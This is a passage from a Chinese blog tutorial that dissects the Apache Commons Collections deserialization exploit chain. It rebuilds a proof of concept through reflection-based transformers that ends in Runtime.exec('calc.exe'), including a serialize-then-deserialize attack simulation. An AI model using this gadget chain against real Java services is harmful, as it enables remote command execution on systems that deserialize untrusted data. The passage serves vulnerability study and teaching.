Class[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">"calc.exe"</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建Map并绑定transformerChina</span></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">"value"</span>, <span class="string">"value"</span>);</span><br><span class="line">        <span class="comment">//给予map数据转化链</span></span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//触发漏洞</span></span><br><span class="line">        Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();</span><br><span class="line">        <span class="comment">//outerMap后一串东西，其实就是获取这个map的第一个键值对（value,value）；然后转化成Map.Entry形式，这是map的键值对数据格式</span></span><br><span class="line">        onlyElement.setValue(<span class="string">"foobar"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><blockquote><p>好好看代码的同学肯定会意识到，以上的poc其实只包括我总结三要素的payload和反序列化利用链两者。<br>而关键的readObject复写利用点没有包含在内。事实确实如此。<br>这个poc的复写利用点是<code>sun.reflect.annotation.AnnotationInvocationHandler的readObject()</code>，但是我们先精简代码关注payload和利用链，最后再加上readObject复写点。</p></blockquote><p>调试以上POC，得到两种调用栈：<br><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g78ayvj8v1j30yr06jdgi.jpg" alt="调用栈1.png"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g78ayzj2sqj30yl06b0te.jpg" alt="调用栈2.png"></p><h3 id="漏洞链"><a href="#漏洞链" class="headerlink" title="漏洞链"></a>漏洞链</h3><p><a href="https://blog.csdn.net/gm371200587/article/details/82108372" target="_blank" rel="noopener">Map.Entry</a>其实就是键值对的数据格式，其setValue函数如下<br><code>AbstracInputCheckedMapDecorator.class</code><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">setValue</span><span class="params">(Object value)</span> </span>&#123;</span><br><span class="line">    value = <span class="keyword">this</span>.parent.checkSetValue(value);<span class="comment">//进入此处</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">super</span>.entry.setValue(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><a href="http://commons.apache.org/proper/commons-collections/javadocs/api-3.2.2/org/apache/commons/collections/map/TransformedMap.html" target="_blank" rel="noopener">TransformedMap</a>是一种重写map类型的set函数和Map.Entry类型的setValue函数去调用转换链的Map类型。<br><code>TransformedMap.class</code><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">checkSetValue</span><span class="params">(Object value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.valueTransformer.transform(value);<span class="comment">//进入此处</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>由于TransformedMap具有commons_collections的转变特性，当赋值一个键值对的时候会自动对输入值进行预设的Transformer的调用。</p><p><a href="http://commons.apache.org/proper/commons-collections/javadocs/api-3.2.2/org/apache/commons/collections/functors/ChainedTransformer.html" target="_blank" rel="noopener"><code>ChainedTransformer.class</code></a>：这里有一个<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">         <span class="comment">//循环进入此处，先进入1次ConstantTransformer.class，再3次InvokerTransformer.class</span></span><br><span class="line">         object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">         <span class="comment">//另外需要注意在数组的循环中，前一次transform函数的返回值，会作为下一次transform函数的object参数输入。</span></span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> object;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p><p><code>transform()</code>函数是一个接口函数，在上面的循环中进入了不同的函数。<br>先是1次<a href="http://commons.apache.org/proper/commons-collections/javadocs/api-3.2.2/org/apache/commons/collections/functors/ConstantTransformer.html" target="_blank" rel="noopener"><code>ConstantTransformer.class</code></a><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>再是进入了<a href="http://commons.apache.org/proper/commons-collections/javadocs/api-3.2.2/org/apache/commons/collections/functors/InvokerTransformer.html" target="_blank" rel="noopener"><code>InvokerTransformer.class</code></a>，看到这个就会发现有点东西了。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">//获取input对象的class</span></span><br><span class="line">                Class cls = input.getClass();</span><br><span class="line">                <span class="comment">//根据iMethodName、iParamTypes选择cls中的一个方法</span></span><br><span class="line">                Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">                <span class="comment">//根据iArgs参数调用这个方法</span></span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var5) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' does not exist"</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException var6) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' cannot be accessed"</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException var7) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' threw an exception"</span>, var7);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>明显的反射机制，可见<strong>InvokerTransformer</strong>就是我们的触发任意代码执行处，我们看看源码中的文件描述：<br>先看看我们需要关注的<code>InvokerTransformer</code>类的描述（在jar包中是找不到描述信息的，可以通过下载<a href="https://www-us.apache.org/dist//commons/collections/" target="_blank" rel="noopener">官方源码</a>得到）：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Transformer implementation that creates a new object instance by reflection.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> 通过反射机制创建一个新的对象实例的转换器实现</span></span><br></pre></td></tr></table></figure></p><p>我们可以这里有经典的反射机制调用，在细节分析前我们先整理一下调用栈</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Map.Entry 类型setValue(<span class="string">"foobar"</span>)</span><br><span class="line">=&gt; AbstracInputCheckedMapDecorator.setValue()</span><br><span class="line">=&gt; TransformedMap.checkSetValue()</span><br><span class="line">=&gt; ChainedTransformer.transform(Object object)</span><br><span class="line">    根据数组，先进入 =&gt; ConstantTransformer.transform(Object input)</span><br><span class="line">    再进入 =&gt; InvokerTransformer.transform(Object input)</span><br></pre></td></tr></table></figure><h2 id="重构POC"><a href="#重构POC" class="headerlink" title="重构POC"></a>重构POC</h2><p>首先明确我们的最终目的是为了执行语句<code>Runtime.getRuntime().exec(&quot;calc.exe&quot;);</code></p><ul><li>Runtime.getRuntime：获取一个Runtime的实例</li><li>exec()：调用实例的exec函数</li></ul><p>因为漏洞函数最后是通过反射机制调用任意这个语句先转化成反射机制如下（后面需要用到）：</p><blockquote><p>至于如何构造反射机制的语句，参考另一篇博客java反射机制</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(<span class="string">"java.lang.Runtime"</span>)</span><br><span class="line">.getMethod(<span class="string">"exec"</span>, String.class)</span><br><span class="line">.invoke(</span><br><span class="line">Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>).invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>))<span class="comment">//此处在获取实例</span></span><br><span class="line">,</span><br><span class="line"><span class="string">"calc.exe"</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="第一步-InvokerTransformer"><a href="#第一步-InvokerTransformer" class="headerlink" title="第一步 InvokerTransformer"></a>第一步 InvokerTransformer</h3><p>再回看反射机制触发函数<code>InvokerTransformer</code>类的<code>transform(Object input)</code>（做了简化处理，只留取重点部分）：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    Class cls = input.getClass();</span><br><span class="line">    Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">    <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br></pre></td></tr></table></figure></p><p>通过构造的反射机制以及以上代码进行填空，可以得出当变量等于以下值时，可形成命令执行：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Object input=Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>).invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>));</span><br><span class="line"><span class="keyword">this</span>.iMethodName=<span class="string">"exec"</span></span><br><span class="line"><span class="keyword">this</span>.iParamTypes=String.class</span><br><span class="line"><span class="keyword">this</span>.iArgs=<span class="string">"calc.exe"</span></span><br></pre></td></tr></table></figure></p><p>那么在<code>InvokerTransformer</code>类源码中我们可以找到赋值this.iMethodName,this.iParamTypes,this.iArgs的构造函数:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">    <span class="keyword">this</span>.iParamTypes = paramTypes;</span><br><span class="line">    <span class="keyword">this</span>.iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们就可以构建以下测试代码直接调用InvokerTransformer通过反射执行任意命令：<br>下面开始试一下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">//通过构造函数，输入对应格式的参数，对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">    InvokerTransformer a = <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">            <span class="string">"exec"</span>,</span><br><span class="line">            <span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">            <span class="keyword">new</span> String[]&#123;<span class="string">"calc.exe"</span>&#125;</span><br><span class="line">    );</span><br><span class="line">    <span class="comment">//构造input</span></span><br><span class="line">    Object input=Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>).invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>));</span><br><span class="line">    <span class="comment">//执行</span></span><br><span class="line">    a.transform(input);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g78azcuhh3j31nb0jfn1d.jpg" alt="反射机制执行任意命令.png"></p><h3 id="在第二步之前"><a href="#在第二步之前" class="headerlink" title="在第二步之前"></a>在第二步之前</h3><p>弹出了计算器！好像很厉害的样子！然后我们来模拟一下利用场景：</p><ul><li>为了方便，攻击者受害者写在同一函数中</li><li>使用文件写入，代替网络传输</li></ul><blockquote><p>由于InvokerTransformer继承了Serializable类，是可以成功序列化的</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">//模拟攻击</span></span><br><span class="line">    <span class="comment">//1.客户端构造序列化payload，使用写入文件模拟发包攻击</span></span><br><span class="line">    InvokerTransformer a = <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">            <span class="string">"exec"</span>,</span><br><span class="line">            <span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">            <span class="keyword">new</span> String[]&#123;<span class="string">"calc.exe"</span>&#125;);</span><br><span class="line">        </span><br><span class="line">    FileOutputStream f = <span class="keyword">new</span> FileOutputStream(<span class="string">"payload.bin"</span>);</span><br><span class="line">    ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(f);</span><br><span class="line">    fout.writeObject(a);</span><br><span class="line">    <span class="comment">//2.服务端从文件中读取payload模拟接受包，然后触发漏洞</span></span><br><span class="line">    <span class="comment">//服务端反序列化payload读取</span></span><br><span class="line">        FileInputStream fi = <span class="keyword">new</span> FileInputStream(<span class="string">"payload.bin"</span>);</span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(fi);</span><br><span class="line">    <span class="comment">//神奇第一处：服务端需要自主构造恶意input</span></span><br><span class="line">        Object input=Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>).invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>));</span><br><span class="line">    <span class="comment">//神奇第二处：服务端需要将客户端输入反序列化成InvokerTransformer格式，并在服务端自主传入恶意参数input</span></span><br><span class="line">        InvokerTransformer a_in = (InvokerTransformer) fin.readObject();</span><br><span class="line">        a_in.transform(input);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们会发现如果我们要直接利用这个反射机制作为漏洞的话，需要服务端的开发人员：</p><ol><li>帮我们写一个payload作为input；</li><li>接受客户端输入参数，反序列化成InvokerTransformer类</li><li>再刻意调用InvokerTransformer类的transform函数</li></ol><p>实际上…..只有开发人员是自己人的情况下才满足条件吧……<br>所以我们面临一些问题：</p><ol><li>payload肯定需要在客户端可以自定义构造，再传输进入服务端</li><li>服务端需要把我们的输入exp反序列化成一个在代码中可能使用到的类</li><li>并且在代码正常操作中会调用这个类中的一个可触发漏洞地函数（当然这个函数最后会进入我们InvokerTransformer类的transform函数，从而形成命令执行）</li><li>如果这个反序列化的类和这个类触发命令执行的方法可以在一个readObject复写函数中恰好触发，就对于服务端上下文语句没有要求了！</li></ol><blockquote><p>这边假如像预期这样，是对服务端上下文没有要求，因为只要执行readObject就肯定会命令执行，不需要其他上下文条件。<br>但是对于服务端版本环境是有要求的，之后会说到</p></blockquote><p>那么我们一个个来解决问题：首先使客户端自定义paylaod！</p><h3 id="第二步-ChainedTransformer"><a href="#第二步-ChainedTransformer" class="headerlink" title="第二步 ChainedTransformer"></a>第二步 ChainedTransformer</h3><p>下面我们需要关注<strong>ChainedTransformer</strong>这个类,首先看一下这个类的描述：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Transformer implementation that chains the specified transformers together.</span></span><br><span class="line"><span class="comment">* &lt;p&gt;</span></span><br><span class="line"><span class="comment">* The input object is passed to the first transformer. The transformed result</span></span><br><span class="line"><span class="comment">* is passed to the second transformer and so on.</span></span><br><span class="line"><span class="comment">* </span></span><br><span class="line"><span class="comment">将指定的转换器连接在一起的转化器实现。</span></span><br><span class="line"><span class="comment">输入的对象将被传递到第一个转化器，转换结果将会输入到第二个转化器，并以此类推</span></span><br></pre></td></tr></table></figure></p><p>可以知道他会把我们的Transformer变成一个串，再逐一执行，其中这个操作对应的就是<strong>ChainedTransformer</strong>类的<code>transform</code>函数<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Transforms the input to result via each decorated transformer</span></span><br><span class="line"><span class="comment">    * </span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> object  the input object passed to the first transformer</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span> the transformed result</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">        object = iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里会遍历iTransformers数组，依次调用这个数组中每一个Transformer的transform，并串行传递执行结果。</p><p>首先确定iTransformers可控，<strong>iTransformers数组</strong>是通过<strong>ChainedTransformer</strong>类的构造函数赋值的：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Constructor that performs no validation.</span></span><br><span class="line"><span class="comment"> * Use &lt;code&gt;getInstance&lt;/code&gt; if you want that.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> transformers  the transformers to chain, not copied, no nulls</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>();<span class="comment">//这个super不清楚做了啥，</span></span><br><span class="line">    iTransformers = transformers;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>那么我们知道可以自定义iTransformers的内容，我们已有条件如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//最终执行目标</span></span><br><span class="line">Class.forName(<span class="string">"java.lang.Runtime"</span>)</span><br><span class="line">.getMethod(<span class="string">"exec"</span>, String.class)</span><br><span class="line">.invoke(</span><br><span class="line">Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>).invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>))<span class="comment">//此处在获取实例</span></span><br><span class="line">,</span><br><span class="line"><span class="string">"calc.exe"</span></span><br><span class="line">)</span><br><span class="line"><span class="comment">//InvokeTransformer关键语句：</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    Class cls = input.getClass();</span><br><span class="line">    Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">    <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>再看到InvokeTransformer代码我们需要<strong>引出一个注意点</strong>：</p><blockquote><p>这里我们需要注意到<code>input.getClass()</code>这个方法使用上的一些区别：</p><ul><li>当input是一个类的实例对象时，获取到的是这个类</li><li>当input是一个类时，获取到的是java.lang.Class</li></ul><p>可以使用如下代码验证，这里不再赘述</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Object a = Runtime.getRuntime();</span><br><span class="line">Class b = Runtime.class;</span><br><span class="line">System.out.println(a.getClass());</span><br><span class="line">System.out.println(b.getClass());</span><br><span class="line"></span><br><span class="line"><span class="comment">//结果</span></span><br><span class="line"><span class="comment">//class java.lang.Runtime</span></span><br><span class="line"><span class="comment">//class java.lang.Class</span></span><br></pre></td></tr></table></figure><p>基于之前写的代码：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//只调用InvokeTransformer的情况如下：</span></span><br><span class="line">    InvokerTransformer a = <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">                <span class="string">"exec"</span>,</span><br><span class="line">                <span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> String[]&#123;<span class="string">"calc.exe"</span>&#125;);</span><br><span class="line"></span><br><span class="line">    Object input=Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>).invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>));</span><br></pre></td></tr></table></figure></p><p>我们也可以知道input的为Runtime类的对象，所以cls就是Runtime类，所以cls.getMethod可以找到exec方法，直接进行调用。</p><p>先把a封装成ChainedTransformer格式，但是payload还是在外面<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//客户端构造payload</span></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> String[]&#123;<span class="string">"calc.exe"</span>&#125;);</span><br><span class="line">&#125;</span><br><span class="line">Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line"><span class="comment">//服务端触发所需内容</span></span><br><span class="line">Object input=Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>).invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>));</span><br><span class="line">transformerChain.transform(input);<span class="comment">//此处必须为input，作为第一个输入</span></span><br></pre></td></tr></table></figure></p><p>把payload放入Transformer数组中，需要转化成特定的Transformer格式才行。</p><h4 id="第二点五步-ConstantTransformer-gt-Runtime实例序列化"><a href="#第二点五步-ConstantTransformer-gt-Runtime实例序列化" class="headerlink" title="第二点五步 ConstantTransformer -&gt; Runtime实例序列化"></a>第二点五步 ConstantTransformer -&gt; Runtime实例序列化</h4><p>我们找到<code>ConstantTransformer</code>类跟<code>InvokkerTransformer</code>一样继承<code>Transforme</code>父类，可以进入数组<br>顾名思义ConstantTransformer类其实就只会存放一个常量；它的构造函数会写入这个变量，他的transform函数会返回这个变量。<br>把Runtime实例写入这个变量：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">    <span class="comment">//以下两个语句等同,一个是通过反射机制得到，一个是直接调用得到Runtime实例</span></span><br><span class="line">    <span class="comment">// new ConstantTransformer(Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"))),</span></span><br><span class="line">    <span class="keyword">new</span> ConstantTransformer(Runtime.getRuntime()),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">"calc.exe"</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line">Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">transformerChain.transform(<span class="keyword">null</span>);<span class="comment">//此处输入可以为任意值，因为不会被使用到，相当于初始第一个输入为我们设置的常量</span></span><br></pre></td></tr></table></figure></p><p>以上代码可以成功弹框执行！那么我们模拟一下序列化与反序列化过程！</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 